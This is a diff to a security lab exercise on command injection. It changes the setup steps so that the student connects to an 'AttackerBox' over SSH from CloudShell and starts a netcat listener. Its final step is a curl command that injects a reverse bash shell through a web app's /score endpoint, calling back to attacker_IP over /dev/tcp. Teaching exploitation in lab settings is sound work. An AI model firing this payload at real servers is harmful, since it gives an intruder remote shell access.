@@ -9,16 +9,15 @@ In this exercise you'll build on your understanding of command injection, craft 
 
 ### 🎯 Your Mission
 
-1. Locate the Public IP address of your AttackerBox in the AWS Console.
-2. Open a Terminal and SSH to the AttackerBox (if you haven't already).
+1. Using CloudShell, SSH to the AttackerBox.
 ```bash 
-ssh -i ~/.ssh/keyfile.pem ubuntu@attacker_IP
+ssh -i ~/lab_key.pem ubuntu@attacker_IP
 ```
-3. Run a netcat listener: 
+2. Run a netcat listener: 
 ```bash
 nc -lvp 5789
 ```
-4. Run the following command from your laptop:
+3. Run the following command from your laptop:
 ```bash
 curl -X POST http://website_IP/score -d '""; bash -c "/bin/bash -i > /dev/tcp/attacker_IP/5789 0<&1 2>&1" #'
 ```
